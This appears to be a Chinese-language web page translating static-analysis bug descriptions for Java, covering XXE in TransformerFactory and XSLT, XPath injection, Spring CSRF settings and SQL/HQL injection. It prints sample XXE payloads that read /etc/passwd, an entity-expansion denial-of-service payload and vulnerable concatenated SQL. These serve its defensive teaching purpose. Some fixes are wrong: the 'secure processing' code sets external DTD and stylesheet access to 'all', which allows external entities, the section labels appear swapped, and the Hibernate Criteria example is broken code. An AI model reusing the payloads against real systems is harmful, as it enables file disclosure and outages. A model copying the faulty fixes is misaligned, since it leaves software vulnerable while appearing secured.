href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a><br><a href="http://xerces.apache.org/xerces-j/features.html" target="_blank" rel="noopener">Xerces complete features list</a></p><h1 id="xml解析导致xxe漏洞-TransformerFactory"><a href="#xml解析导致xxe漏洞-TransformerFactory" class="headerlink" title="xml解析导致xxe漏洞(TransformerFactory)"></a>xml解析导致xxe漏洞(TransformerFactory)</h1><p>漏洞特征：XXE_DTD_TRANSFORM_FACTORY<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = TransformerFactory.newInstance().newTransformer();</span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以使用其中一个，或者两个都使用</p><p><strong>使用”Secure processing” 模式的解决方案:</strong><br>这个设置能保护你能避免拒绝服务攻击和ssrf漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory factory = TransformerFactory.newInstance();</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;all&quot;);</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;all&quot;);</span><br><span class="line"></span><br><span class="line">Transformer transformer = factory.newTransformer();</span><br><span class="line">transformer.setOutputProperty(OutputKeys.INDENT, &quot;yes&quot;);</span><br><span class="line"></span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p><strong>禁用DTD的解决方案:</strong><br>通过禁用DTD，大多数的xxe攻击都可以被避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory factory = TransformerFactory.newInstance();</span><br><span class="line">factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line"></span><br><span class="line">Transformer transformer = factory.newTransformer();</span><br><span class="line">transformer.setOutputProperty(OutputKeys.INDENT, &quot;yes&quot;);</span><br><span class="line"></span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a></p><h1 id="XSLT解析导致xxe漏洞-TransformerFactory"><a href="#XSLT解析导致xxe漏洞-TransformerFactory" class="headerlink" title="XSLT解析导致xxe漏洞(TransformerFactory)"></a>XSLT解析导致xxe漏洞(TransformerFactory)</h1><p>漏洞特征：XXE_XSLT_TRANSFORM_FACTORY<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">   &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">       &lt;xsl:value-of select=&quot;document(&apos;/etc/passwd&apos;)&quot;&gt;</span><br><span class="line">   &lt;/xsl:value-of&gt;&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = TransformerFactory.newInstance().newTransformer();</span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以使用其中一个，或者两个都使用</p><p><strong>使用”Secure processing” 模式的解决方案:</strong><br>这个设置能保护你能避免ssrf漏洞但是不能避免拒绝服务攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory factory = TransformerFactory.newInstance();</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;all&quot;);</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;all&quot;);</span><br><span class="line"></span><br><span class="line">Transformer transformer = factory.newTransformer();</span><br><span class="line">transformer.setOutputProperty(OutputKeys.INDENT, &quot;yes&quot;);</span><br><span class="line"></span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p><strong>禁用DTD的解决方案:</strong><br>这个设置能保护你能避免ssrf漏洞但是不能避免拒绝服务攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory factory = TransformerFactory.newInstance();</span><br><span class="line">factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line"></span><br><span class="line">Transformer transformer = factory.newTransformer();</span><br><span class="line">transformer.setOutputProperty(OutputKeys.INDENT, &quot;yes&quot;);</span><br><span class="line"></span><br><span class="line">transformer.transform(input, result);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a></p><h1 id="潜在的XPath注入"><a href="#潜在的XPath注入" class="headerlink" title="潜在的XPath注入"></a>潜在的XPath注入</h1><p>漏洞特征： XPATH_INJECTION<br>XPath注入的危险程度就像sql注入一样。如果XPath查询包含不信任的用户输入，那么数据库就会被完全暴露。这样就可以让攻击者访问未授权的数据或者在目标xml数据库中放入恶意数据。</p><p>引用：<br>[WASC-39: XPath Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/643.html" target="_blank" rel="noopener">CWE-643: Improper Neutralization of Data within XPath Expressions (‘XPath Injection’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61407250" target="_blank" rel="noopener">CERT: IDS09-J. Prevent XPath Injection (archive)</a><br><a href="http://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-WP.pdf" target="_blank" rel="noopener">Black Hat Europe 2012: Hacking XPath 2.0</a><br><a href="http://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html" target="_blank" rel="noopener">Balisage: XQuery Injection</a></p><h1 id="发现Struts-1-服务器端"><a href="#发现Struts-1-服务器端" class="headerlink" title="发现Struts 1 服务器端"></a>发现Struts 1 服务器端</h1><p>漏洞特征： STRUTS1_ENDPOINT<br>这个类是Struts 1 的Action<br>曾清一个请求被路由到一个控制器中，Form对象将会被自动的实例化为http参数的对象。这些参数应该被严格检查，以保证它们是安全的。</p><h1 id="发现Struts-2-服务器端"><a href="#发现Struts-2-服务器端" class="headerlink" title="发现Struts 2 服务器端"></a>发现Struts 2 服务器端</h1><p>漏洞特征：STRUTS2_ENDPOINT<br>在Struts 2中，服务器端是简单的Java对象 (POJOs)，这就意味着没有接口/类 需要被实现/拓展</p><p>当一个请求被路由到它的控制器的时候（像这些被选择的类），http提供的参数会被自动的映射到类中的setters中。所以，所有类中的setters都应该被看成来自不被信任源的输入，即使form中没有包含那些值。一个攻击者都被在请求中插入一些额外的值，他们会被当成对象，只要对象具有这样的setter。这些参数应该被严格检查，以保证它们是安全的。</p><h1 id="发现Spring-服务器端"><a href="#发现Spring-服务器端" class="headerlink" title="发现Spring 服务器端"></a>发现Spring 服务器端</h1><p>漏洞特征： SPRING_ENDPOINT<br>这个类是一个Spring的控制器。所有方法的注解都在RequestMapping（还有一些简化注解在GetMapping, PostMapping, PutMapping, DeleteMapping, 和 PatchMapping），这些方法都能被远程访问到。这些类应该被严格的分析，以保证暴露给远程的方法是安全的，不会被攻击者轻易攻击。</p><h1 id="Spring关闭-CSRF保护"><a href="#Spring关闭-CSRF保护" class="headerlink" title="Spring关闭 CSRF保护"></a>Spring关闭 CSRF保护</h1><p>漏洞特征： SPRING_CSRF_PROTECTION_DISABLED<br>对于标准的web应用程序来讲，关闭Spring的CSRF保护显然是不安全的。<br>禁用此保护的有效使用场景是服务器暴露一个可以改变状态的接口，这个接口仅可以被非浏览器操控。</p><p><strong>不安全的配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@EnableWebSecurity</span><br><span class="line">public class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void configure(HttpSecurity http) throws Exception &#123;</span><br><span class="line">        http.csrf().disable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html#when-to-use-csrf-protection" target="_blank" rel="noopener">Spring Security Official Documentation: When to use CSRF protection</a><br><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html#when-to-use-csrf-protection" target="_blank" rel="noopener">OWASP: Cross-Site Request Forgery</a><br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: CSRF Prevention Cheat Sheet</a><br><a href="https://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noopener">CWE-352: Cross-Site Request Forgery (CSRF)</a></p><h1 id="Spring-中不受CSRF限制的RequestMapping"><a href="#Spring-中不受CSRF限制的RequestMapping" class="headerlink" title="Spring 中不受CSRF限制的RequestMapping"></a>Spring 中不受CSRF限制的RequestMapping</h1><p>漏洞特征： SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING<br>通过默认的映射所有的HTTP请求方法都会被RequestMapping注解。可是，http请求中的GET, HEAD, TRACE, 和OPTIONS（可能会导致tokens被泄露）方法不会默认开启csrf保护。所以，被RequestMapping注解的可以改变状态的方法和 POST, PUT, DELETE, 或者 PATCH这些http请求方法都会受到csrf攻击。</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class UnsafeController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/path&quot;)</span><br><span class="line">    public void writeData() &#123;</span><br><span class="line">        // State-changing operations performed within this method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案（Spring Framework 4.3和更新的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class SafeController &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * For methods without side-effects use @GetMapping.</span><br><span class="line">     */</span><br><span class="line">    @GetMapping(&quot;/path&quot;)</span><br><span class="line">    public String readData() &#123;</span><br><span class="line">        // No state-changing operations performed within this method.</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * For state-changing methods use either @PostMapping, @PutMapping, @DeleteMapping, or @PatchMapping.</span><br><span class="line">     */</span><br><span class="line">    @PostMapping(&quot;/path&quot;)</span><br><span class="line">    public void writeData() &#123;</span><br><span class="line">        // State-changing operations performed within this method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案（在Spring Framework 4.3之前的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class SafeController &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * For methods without side-effects use either</span><br><span class="line">     * RequestMethod.GET, RequestMethod.HEAD, RequestMethod.TRACE, or RequestMethod.OPTIONS.</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/path&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String readData() &#123;</span><br><span class="line">        // No state-changing operations performed within this method.</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * For state-changing methods use either</span><br><span class="line">     * RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE, or RequestMethod.PATCH.</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/path&quot;, method = RequestMethod.POST)</span><br><span class="line">    public void writeData() &#123;</span><br><span class="line">        // State-changing operations performed within this method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br>[Spring Security Official Documentation: Use proper HTTP verbs (CSRF protection)](Spring Security Official Documentation: Use proper HTTP verbs (CSRF protection))<br>[OWASP: Cross-Site Request Forgery](OWASP: Cross-Site Request Forgery)<br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: CSRF Prevention Cheat Sheet</a><br><a href="https://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noopener">CWE-352: Cross-Site Request Forgery (CSRF)</a></p><h1 id="潜在的注入（custom）"><a href="#潜在的注入（custom）" class="headerlink" title="潜在的注入（custom）"></a>潜在的注入（custom）</h1><p>漏洞特征： CUSTOM_INJECTION<br>扫描工具所识别的函数存在注射问题。应验证输入并争取转义。</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlUtil.execQuery(&quot;select * from UserEntity t where id = &quot; + parameterInput);</span><br></pre></td></tr></table></figure><p>wiki在线有很详细的教程关于<a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/Custom-signatures" target="_blank" rel="noopener">如何配置custom</a></p><p>引用：<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a><br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a></p><h1 id="潜在的sql注入"><a href="#潜在的sql注入" class="headerlink" title="潜在的sql注入"></a>潜在的sql注入</h1><p>漏洞特征：SQL_INJECTION<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。或者，每一个参数应该被正确的转义。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createQuery(&quot;select * from User where id = &apos;&quot;+inputId+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import org.owasp.esapi.Encoder;</span><br><span class="line"></span><br><span class="line">createQuery(&quot;select * from User where id = &apos;&quot;+Encoder.encodeForSQL(inputId)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><p>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="在Turbine中潜在的sql注入"><a href="#在Turbine中潜在的sql注入" class="headerlink" title="在Turbine中潜在的sql注入"></a>在Turbine中潜在的sql注入</h1><p>漏洞特征：SQL_INJECTION_TURBINE<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。或者，每一个参数应该被正确的转义。<br>Turbine API 提供DSL在java代码中构建查询<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Record&gt; BasePeer.executeQuery( &quot;select * from Customer where id=&quot; + inputId );</span><br></pre></td></tr></table></figure><p>解决方案（使用Criteria DSL）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Criteria c = new Criteria();</span><br><span class="line">c.add( CustomerPeer.ID, inputId );</span><br><span class="line"></span><br><span class="line">List&lt;Customer&gt; customers = CustomerPeer.doSelect( c );</span><br></pre></td></tr></table></figure><p>解决方案（使用特殊方法）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Customer customer = CustomerPeer.retrieveByPK( new NumberKey( inputId ) );</span><br></pre></td></tr></table></figure><p>解决方法（使用OWASP提供的编码方法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import org.owasp.esapi.Encoder;</span><br><span class="line"></span><br><span class="line">BasePeer.executeQuery(&quot;select * from Customer where id = &apos;&quot;+Encoder.encodeForSQL(inputId)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><p>引用(Turbine)：<br><a href="https://turbine.apache.org/turbine/turbine-2.1/howto/criteria-howto.html" target="_blank" rel="noopener">Turbine Documentation: Criteria Howto</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的SQL-HQL注入-Hibernate"><a href="#潜在的SQL-HQL注入-Hibernate" class="headerlink" title="潜在的SQL/HQL注入(Hibernate)"></a>潜在的SQL/HQL注入(Hibernate)</h1><p>漏洞特征：SQL_INJECTION_HIBERNATE<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。或者，可以使用Hibernate的Criteria。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session session = sessionFactory.openSession();</span><br><span class="line">Query q = session.createQuery(&quot;select t from UserEntity t where id = &quot; + input);</span><br><span class="line">q.execute();</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Session session = sessionFactory.openSession();</span><br><span class="line">Query q = session.createQuery(&quot;select t from UserEntity t where id = :userId&quot;);</span><br><span class="line">q.setString(&quot;userId&quot;,input);</span><br><span class="line">q.execute();</span><br></pre></td></tr></table></figure><p>动态查询参数法解决方案（Hibernate Criteria）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Session session = sessionFactory.openSession();</span><br><span class="line">Query q = session.createCriteria(UserEntity.class)</span><br><span class="line">    .add( Restrictions.like(&quot;id&quot;, input) )</span><br><span class="line">    .list();</span><br><span class="line">q.execute();</span><br></pre></td></tr></table></figure><p>引用(Hibernate)<br><a href="https://docs.jboss.org/hibernate/orm/3.3/reference/en/html/querycriteria.html" target="_blank" rel="noopener">Hibernate Documentation: Query Criteria</a><br><a href="https://docs.jboss.org/hibernate/orm/3.2/api/org/hibernate/Query.html" target="_blank" rel="noopener">Hibernate Javadoc: Query Object</a><br><a href="http://blog.h3xstream.com/2014/02/hql-for-pentesters.html" target="_blank" rel="noopener">HQL for pentesters: Guideline to test if the suspected code is exploitable.</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" 